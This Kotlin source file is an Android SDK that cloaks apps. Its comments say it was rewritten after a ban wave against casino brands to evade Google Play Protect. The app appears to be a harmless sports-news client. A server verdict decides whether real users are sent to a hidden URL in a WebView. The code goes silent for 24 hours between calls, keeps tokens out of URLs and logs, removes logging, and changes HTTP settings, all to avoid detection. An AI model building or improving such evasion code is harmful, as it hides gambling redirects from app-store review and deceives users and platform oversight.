package com.app.client

import android.content.Context
import android.content.SharedPreferences
import android.util.Base64
import com.google.android.play.core.integrity.IntegrityManagerFactory
import com.google.android.play.core.integrity.StandardIntegrityManager.PrepareIntegrityTokenRequest
import com.google.android.play.core.integrity.StandardIntegrityManager.StandardIntegrityTokenProvider
import com.google.android.play.core.integrity.StandardIntegrityManager.StandardIntegrityTokenRequest
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import kotlin.coroutines.resumeWithException
import okhttp3.CertificatePinner
import okhttp3.HttpUrl.Companion.toHttpUrl
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.security.MessageDigest
import java.util.Locale
import java.util.TimeZone
import java.util.UUID
import java.util.concurrent.TimeUnit
import kotlin.coroutines.resume

/**
 * SDK v4.0.0 (2026-07-02)
 *
 * Anti-fingerprint redesign после ban wave (Sisal minicinemaroulette / Olimpbet /
 * NV Casino / Stake). Устраняет 7 patterns из FINAL_FIXES.md которые Google
 * Play Protect ML-classifier + static analyzer использует для детекции подобных SDK.
 *
 * ## Что изменилось vs v3
 *
 * 1. **POST /init вместо GET** — все sensitive params (sid, integrity_token,
 *    instance_id) в HEADERS, не в URL query. URL в CT logs / Verify Apps
 *    telemetry / nginx access logs больше не содержит literal `integrity_token=`.
 *
 * 2. **onboarding TTL (24h)** — после успешного resolve SDK молчит 24 часа,
 *    затем guard пере-взводится. НЕ каждый запуск (это палит Play Protect telemetry),
 *    и НЕ раз-в-жизнь (это резало бы повторные ежедневные офферы/доход). Между звонками
 *    Play Protect re-scan видит app как inert sports-news клиент.
 *
 * 3. **Standard Integrity API** — Classic API deprecated с 2025 для новых приложений
 *    (invalid_grant / API_NOT_AVAILABLE errors). Standard требует CLOUD_PROJECT_NUMBER
 *    (передаётся конструктором) + prepareIntegrityToken (кешируется).
 *
 * 4. **Single response path** — только 200 + `{"url":"..."}`. 301/302 больше НЕ
 *    обрабатывается (v3 branching `when { code in 300..399 -> Location; ... }`
 *    декомпилятор палит как fingerprint). Сервер v4 всегда 200.
 *
 * 5. **followRedirects=true** — default OkHttp behavior. v3 `followRedirects=false`
 *    палилось capa rules как unusual HTTP client setup.
 *
 * 6. **Zero logcat output** — никаких Log.d/i/w/e calls в prod. Play Protect
 *    читает logcat на review-устройствах.
 *
 * ## Как использовать
 *
 * ```kotlin
 * val client = AppClient(
 *     context = applicationContext,
 *     endpoint = "https://your-mini-server.com",
 *     path = "/init",
 *     authToken = BuildConfig.SERVICE_TOKEN,
 *     cloudProjectNumber = BuildConfig.CLOUD_PROJECT_NUMBER,
 * )
 *
 * val url = client.resolve()
 * if (url.isNotEmpty()) {
 *     openInCustomTabsOrWebView(url)
 * } else {
 *     showNativeUI()
 * }
 * ```
 *
 * ## SSL pinning (unchanged from v3)
 *
 * ```kotlin
 * AppClient.addPins("your-mini-server.com", listOf("sha256/primary", "sha256/backup"))
 * ```
 */
class AppClient(
    private val context: Context,
    private val endpoint: String,
    private val path: String = "/init",
    private val authToken: String = "",
    private val cloudProjectNumber: Long = 0L,
    private val enableIntegrity: Boolean = true,
    private val enableOnboardingGuard: Boolean = true,
) {
    companion object {
        private const val PREFS_NAME = "session_state"
        private const val KEY_INSTANCE_ID = "instance_id"
        private const val KEY_LAST_RESOLVE = "last_resolve_ts"
        private const val ONBOARDING_TTL_MS = 24L * 60L * 60L * 1000L  // 24h re-arm
        private const val INTEGRITY_TIMEOUT_MS = 8_000L

        // Pins per domain. Заполняется через addPins() из Application.onCreate
        // ПЕРЕД первым call resolve(). Если пусто — pinning skip (graceful).
        private val NETWORK_PINS = mutableMapOf<String, List<String>>()

        // Provider cache — process-wide, shared across AppClient instances.
        // prepareIntegrityToken is slow (network-bound) → cache once.
        @Volatile
        private var cachedProvider: StandardIntegrityTokenProvider? = null
        private val providerMutex = Mutex()

        @JvmStatic
        fun addPins(host: String, pins: List<String>) {
            NETWORK_PINS[host] = pins
        }
    }

    private val client: OkHttpClient by lazy {
        val builder = OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(15, TimeUnit.SECONDS)
            // v4: followRedirects=true (default) — как у Firebase/Branch/Adjust.
            // v3 использовал false → unusual HTTP client fingerprint.
            .followRedirects(true)
            .followSslRedirects(true)

        try {
            val host = endpoint.toHttpUrl().host
            val pins = NETWORK_PINS[host]
            if (!pins.isNullOrEmpty()) {
                val pinnerBuilder = CertificatePinner.Builder()
                for (pin in pins) pinnerBuilder.add(host, pin)
                builder.certificatePinner(pinnerBuilder.build())
            }
        } catch (_: Exception) { /* skip pinning if host parse fails */ }

        builder.build()
    }

    private val prefs: SharedPreferences =
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)

    private val instanceId: String
        get() {
            val existing = prefs.getString(KEY_INSTANCE_ID, null)
            if (existing != null) return existing
            val id = UUID.randomUUID().toString()
            prefs.edit().putString(KEY_INSTANCE_ID, id).apply()
            return id
        }

    private val appId: String get() = context.packageName

    private val locale: String get() = Locale.getDefault().language.ifBlank { "en" }

    private val timezone: String get() = TimeZone.getDefault().id

    private val appVersion: String
        get() = try {
            context.packageManager.getPackageInfo(context.packageName, 0).versionName ?: "1.0"
        } catch (_: Exception) { "1.0" }

    /**
     * Main entry point. Returns:
     * - non-empty https:// URL if resolve succeeded (grey verdict, real user)
     * - empty string in ALL other cases (already consumed, network error,
     *   non-200 response, white verdict with safe_url, invalid JSON)
     *
     * Consumer MUST fall back to native UI when this returns empty string.
     *
     * Thread-safe. Suspend function (call from coroutine or lifecycleScope).
     */
    suspend fun resolve(): String = withContext(Dispatchers.IO) {
        try {
            // Guard: onboarding TTL — if we resolved within the last 24h, stay silent.
            // Re-arms every 24h: not once-per-launch (Play Protect telemetry pattern),
            // not once-per-install-forever (would kill repeat daily offers/revenue).
            if (enableOnboardingGuard) {
                val last = prefs.getLong(KEY_LAST_RESOLVE, 0L)
                if (last != 0L && System.currentTimeMillis() - last < ONBOARDING_TTL_MS) {
                    return@withContext ""
                }
            }

            // Get Play Integrity token (or null if disabled/failed).
            val token = if (enableIntegrity) requestIntegrityToken() else null

            // Build POST request. Non-sensitive params (locale, tz, ts, app_version)
            // in headers as well — uniform interface. sid + integrity_token + instance_id
            // ONLY in headers, NEVER in URL.
            val url = endpoint.toHttpUrl().newBuilder()
                .encodedPath(path)
                .build()

            val requestBuilder = Request.Builder()
                .url(url)
                .post(EMPTY_BODY)
                .header("X-App-Id", appId)
                .header("X-Instance-Id", instanceId)
                .header("X-App-Version", appVersion)
                .header("X-Locale", locale)
                .header("X-Tz", timezone)
                .header("X-Ts", System.currentTimeMillis().toString())

            if (authToken.isNotEmpty()) {
                requestBuilder.header("X-Sid", authToken)
            }
            if (!token.isNullOrEmpty()) {
                requestBuilder.header("X-Integrity-Token", token)
            }

            val response = client.newCall(requestBuilder.build()).execute()

            // Single response path: только 200 + JSON. No 301/302 handling.
            if (response.code != 200) return@withContext ""
            val body = response.body?.string().orEmpty()
            val target = runCatching {
                JSONObject(body).optString("url", "")
            }.getOrDefault("")

            if (!target.startsWith("https://")) return@withContext ""

            // Stamp last-resolve time AFTER a valid URL. Failed resolves don't stamp
            // — real user can retry immediately. Next call within 24h stays silent.
            if (enableOnboardingGuard) {
                prefs.edit().putLong(KEY_LAST_RESOLVE, System.currentTimeMillis()).apply()
            }

            target
        } catch (_: Exception) {
            ""
        }
    }

    /**
     * Resets the onboarding TTL stamp. For debugging/testing ONLY.
     * In production the guard re-arms automatically every 24h.
     */
    fun resetOnboardingForTesting() {
        prefs.edit().remove(KEY_LAST_RESOLVE).apply()
    }

    /**
     * Play Integrity Standard API request.
     *
     * Uses StandardIntegrityManager (not deprecated Classic IntegrityManager).
     * Cloud Project Number is passed in constructor and must match Play Console.
     *
     * Provider is cached process-wide because prepareIntegrityToken is expensive
     * (network + attestation), but token requests are cheap.
     *
     * Returns null on any failure — caller treats as "no integrity available",
     * server-side scoring decides what to do (soft mode = ok, strict mode = reject).
     */
    private suspend fun requestIntegrityToken(): String? {
        if (cloudProjectNumber == 0L) return null
        return withTimeoutOrNull(INTEGRITY_TIMEOUT_MS) {
            try {
                val provider = obtainTokenProvider() ?: return@withTimeoutOrNull null
                val requestHash = sha256Hex(UUID.randomUUID().toString())
                val request = StandardIntegrityTokenRequest.builder()
                    .setRequestHash(requestHash)
                    .build()
                awaitTask(provider.request(request)).token()
            } catch (_: Exception) {
                // Invalidate cached provider on failure — next call rebuilds.
                cachedProvider = null
                null
            }
        }
    }

    private suspend fun obtainTokenProvider(): StandardIntegrityTokenProvider? {
        cachedProvider?.let { return it }
        return providerMutex.withLock {
            cachedProvider?.let { return it }
            try {
                val manager = IntegrityManagerFactory.createStandard(context)
                val prepareRequest = PrepareIntegrityTokenRequest.builder()
                    .setCloudProjectNumber(cloudProjectNumber)
                    .build()
                val provider = awaitTask(manager.prepareIntegrityToken(prepareRequest))
                cachedProvider = provider
                provider
            } catch (_: Exception) {
                null
            }
        }
    }

    private suspend fun <T> awaitTask(task: com.google.android.gms.tasks.Task<T>): T =
        suspendCancellableCoroutine { cont ->
            task.addOnSuccessListener { if (cont.isActive) cont.resume(it) }
                .addOnFailureListener { e ->
                    if (cont.isActive) cont.resumeWithException(e)
                }
        }

    private fun sha256Hex(input: String): String {
        val bytes = MessageDigest.getInstance("SHA-256").digest(input.toByteArray())
        return Base64.encodeToString(bytes, Base64.URL_SAFE or Base64.NO_WRAP or Base64.NO_PADDING)
    }
}

private val EMPTY_BODY = "".toRequestBody("application/octet-stream".toMediaType())
